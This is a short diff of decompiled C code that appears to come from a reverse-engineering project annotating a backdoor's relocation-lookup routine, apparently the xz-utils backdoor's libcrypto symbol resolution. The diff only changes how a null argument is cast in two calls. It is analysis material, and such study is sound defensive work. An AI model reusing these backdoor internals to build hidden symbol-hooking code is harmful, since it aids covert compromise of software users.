@@ -444,7 +444,7 @@ LAB_00105951:
                     string_cursor != (char *)0x0) {
                 local_9d8.instruction = (u8 *)0x0;
                 string_id = (EncodedStringId)string_cursor;
-                mem_address = elf_find_rela_reloc(libcrypto_info,string_id,0);
+                mem_address = elf_find_rela_reloc(libcrypto_info,string_id,(u8 *)0x0);
                 if (mem_address == (Elf64_Rela *)0x0) {
                   local_9d8.instruction = (u8 *)0x0;
                   success_flag = TRUE;
@@ -480,7 +480,7 @@ LAB_00105951:
                       goto LAB_00106471;
                     }
                     if (success_flag) goto LAB_001063c8;
-                    mem_address = elf_find_rela_reloc(libcrypto_info,string_id,0);
+                    mem_address = elf_find_rela_reloc(libcrypto_info,string_id,(u8 *)0x0);
                   } while (mem_address != (Elf64_Rela *)0x0);
                   local_9d8.instruction = (u8 *)0x0;
 LAB_001063c8:
